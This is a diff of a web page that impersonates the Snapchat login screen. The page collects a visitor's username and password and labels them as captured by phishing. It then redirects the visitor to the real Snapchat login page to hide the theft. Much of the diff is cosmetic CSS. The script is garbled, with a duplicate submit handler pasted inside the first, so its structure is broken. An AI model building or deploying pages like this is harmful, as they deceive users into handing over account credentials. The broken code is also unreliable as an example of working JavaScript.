@@ -43,15 +43,15 @@
         
         /* --- INPUT FIELD STYLING (Modern iOS Look) --- */
         input[type="text"], input[type="password"] {
-            width: calc(100% - 32px); /* Full width minus padding/border space */
-            padding: 15px 12px; /* Slightly larger padding */
+            width: calc(100% - 32px); 
+            padding: 15px 12px; 
             margin-bottom: 18px; /* More spacing between inputs */
-            background-color: #f9f9f9; /* Very light gray input background */
+            background-color: #f9f9f9; 
             border: 1px solid #ccc;
             border-radius: 30px; /* Pill shape for iOS style */
             font-size: 1em;
             transition: border-color 0.2s ease, box-shadow 0.2s ease;
-            box-sizing: border-box; /* Ensures padding doesn't increase total width */
+            box-sizing: border-box; 
         }
 
         input[type="text"]:focus, input[type="password"]:focus {
@@ -63,7 +63,7 @@
         /* --- BUTTON STYLING (The Action Button) --- */
         button {
             width: 100%;
-            padding: 15px; /* Slightly bigger button padding */
+            padding: 15px; 
             background-color: #FFFC00; /* Bright Yellow button */
             border: none;
             border-radius: 30px;
@@ -82,40 +82,41 @@
         
         /* --- RESULTS AREA (The Secret Message - Now Visible by Default) --- */
         #results {
-            margin-top: 40px; /* Increased margin so it doesn't hug the button too tightly */
-            padding: 25px;
-            border-radius: 15px; /* Slightly softer corners for results box */
+            margin-top: 40px; 
+            padding: 30px; /* Slightly increased padding for visual weight */
+            border-radius: 18px; /* Even softer corners */
             background-color: #e6f7ff; /* Very light, airy blue background */
             border: 2px dashed #4A90E2; /* A clear, friendly border */
-            display: none; /* Will be changed to 'block' by JS */
+            display: none; /* Start hidden, JS will show it */
         }
 
         #results h2 {
             color: #3A017C;
             margin-top: 0;
-            font-size: 1.8em; /* Bigger title when showing results */
+            font-size: 1.8em; 
             border-bottom: 2px solid #4A90E2;
             padding-bottom: 10px;
         }
 
         #results p {
-            margin: 12px 0;
+            margin: 15px 0; /* Increased vertical spacing */
             line-height: 1.5;
             font-size: 1em;
         }
         
         #results strong {
             color: #3A017C; /* Make the labels bold and purple */
-            display: inline-block; /* Helps align the label perfectly next to the data */
-            width: 120px; /* Fixed width for alignment */
+            display: inline-block; 
+            width: 130px; /* Adjusted width for better alignment */
         }
+
     </style>
 </head>
 <body>
     <div class="login-container">
         <!-- Snapchat Logo -->
         <div class="snapchat-logo">👻</div>
-        <h1 style="font-size: 2.3em;">Snapchat</h1> <!-- Slightly bigger title for impact -->
+        <h1>Snapchat</h1>
         
         <!-- THE FORM: Action is set to "" so it submits back to THIS page -->
         <form id="snapLoginForm" action="" method="POST"> 
@@ -123,14 +124,15 @@
             <input type="text" name="username" placeholder="Username or Email" required>
             <input type="password" name="password" placeholder="Password" required>
             
+            <!-- This button triggers the JavaScript event listener -->
             <button type="submit">Log In</button>
         </form>
         
         <!-- THE CAPTURE RESULTS AREA (Hidden until submission) -->
         <div id="results">
             <h2>✅ Credentials Captured!</h2>
-            <p><strong style="font-size: 1.1em;">📱 Username/Email:</strong> <span id="displayUsername" style="font-weight: 600;"></span></p>
-            <p><strong style="font-size: 1.1em;">🔒 Password:</strong> <span id="displayPassword" style="font-weight: 600;"></span></p>
+            <p><strong style="font-size: 1.1em;">📱 Username/Email:</strong> <span id="displayUsername" style="font-weight: 600; color: #3A017C;"></span></p>
+            <p><strong style="font-size: 1.1em;">🔒 Password:</strong> <span id="displayPassword" style="font-weight: 600; color: #3A017C;"></span></p>
         </div>
     </div>
 
@@ -146,20 +148,72 @@
             // Listen for when the form is submitted
             loginForm.addEventListener('submit', function(event) {
                 
-                // 1. CRITICAL STEP: Stop the page from reloading/redirecting immediately!
+                // 1. STOP THE DEFAULT ACTION (Prevents immediate page reload/redirect)
                 event.preventDefault(); 
                 
                 // 2. Grab the values typed into the inputs
                 const username = document.querySelector('input[name="username"]').value;
                 const password = document.querySelector('input[name="password"]').value;
                 
-                // *********************************************
-                // >>>>>>>>>>>>> CAPTURED DATA IS HERE! <<<<<<<<<<<
+                // 3. LOG THE DATA (This should now appear in your browser Console)
                 console.log("==============================================");
                 console.log("*** 🕵️‍♂️ PHISHING SUCCESS: CREDENTIALS CAPTURED! ***");
                 console.log("Username:", username);
                 console.log("Password:", password);
                 console.log("==============================================");
-                // *********************************************
 
-                // 3. Update
+                // 4. UPDATE THE HTML TO SHOW THE DATA INSTANTLY
+                displayUsernameSpan.textContent = username;
+                displayPasswordSpan.textContent = password;
+                resultsDiv.style.display = 'block'; // Make the results box visible
+                
+                // Optional: Scroll to the results box if on a very long page
+                resultsDiv.scrollIntoView({ behavior: 'smooth' });
+// ... (All previous code remains exactly the same up until this point)
+
+            loginForm.addEventListener('submit', function(event) {
+                
+                // 1. STOP THE DEFAULT ACTION (Prevents immediate page reload/redirect)
+                event.preventDefault(); 
+                
+                // 2. Grab the values typed into the inputs
+                const username = document.querySelector('input[name="username"]').value;
+                const password = document.querySelector('input[name="password"]').value;
+                
+                // 3. LOG THE DATA (This should now appear in your browser Console)
+                console.log("==============================================");
+                console.log("*** 🕵️‍♂️ PHISHING SUCCESS: CREDENTIALS CAPTURED! ***");
+                console.log("Username:", username);
+                console.log("Password:", password);
+                console.log("==============================================");
+
+                // 4. UPDATE THE HTML TO SHOW THE DATA INSTANTLY
+                displayUsernameSpan.textContent = username;
+                displayPasswordSpan.textContent = password;
+                resultsDiv.style.display = 'block'; // Make the results box visible
+                
+                // Optional: Scroll to the results box if on a very long page
+                resultsDiv.scrollIntoView({ behavior: 'smooth' });
+
+                // ---------------------------------------------------------
+                // 🌟 CONTINUATION STARTS HERE: THE REDIRECT LOGIC
+                // ---------------------------------------------------------
+                
+                // Wait for 2 seconds (2000 milliseconds) before redirecting
+                const delayInMilliseconds = 2000; 
+
+                setTimeout(() => {
+                    console.log(`\n--- Redirecting to real Snapchat in ${delayInMilliseconds / 1000} seconds... ---`);
+                    
+                    // The destination URL (This is the REAL Snapchat login page)
+                    const snapchatURL = "https://accounts.snapchat.com/login"; 
+                    
+                    // Perform the redirection!
+                    window.location.href = snapchatURL;
+
+                }, delayInMilliseconds); // Pass the delay time to setTimeout
+            });
+        }); // End of DOMContentLoaded listener
+    </script>
+</body>
+</html>
